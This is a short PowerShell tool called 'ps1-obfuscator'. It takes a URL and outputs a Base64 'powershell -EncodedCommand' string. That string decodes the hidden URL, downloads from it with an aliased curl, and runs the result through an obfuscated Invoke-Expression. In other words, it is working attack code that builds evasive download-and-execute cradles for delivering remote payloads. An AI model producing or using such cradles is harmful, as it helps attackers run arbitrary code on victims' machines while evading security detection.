Write-Host "ps1-obfuscator by fkxdr"
$url = Read-Host "`nEnter URL to obfuscate"
Write-Host "`nGenerating script...`n"

function Generate-RandomName($length) {
    $chars = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
    $name = -join ((1..$length) | ForEach-Object { $chars[(Get-Random -Maximum $chars.Length)] })
    return $name
}

function Obfuscate-Url($inputUrl) {
    $asciiArray = @()
    foreach ($char in $inputUrl.ToCharArray()) {
        $asciiValue = [int][char]$char + 8787
        $asciiArray += $asciiValue
    }
    return $asciiArray
}

$obfuscatedArray = Obfuscate-Url $url
$randomVarName1 = Generate-RandomName(8)
$randomVarName2 = Generate-RandomName(8)
$aliasName = Generate-RandomName(8)

# Construct the PowerShell script to be encoded
$scriptToEncode = @"
new-alias $aliasName curl; `$randomVarName1 = @($($obfuscatedArray -join ',')); `$randomVarName2 = ''; foreach (`$asciiValue in `$randomVarName1) { `$decodedChar=[char](`$asciiValue-8787); `$randomVarName2+=`$decodedChar; }; .([char](9992-9887)+'e'+'x')($aliasName -useb `$randomVarName2)
"@

# Convert the script to Base64 for use with -EncodedCommand
$bytes = [System.Text.Encoding]::Unicode.GetBytes($scriptToEncode)
$encodedCommand = [Convert]::ToBase64String($bytes)

# Output the encoded command that can be used in PowerShell
Write-Host "powershell -EncodedCommand $encodedCommand"
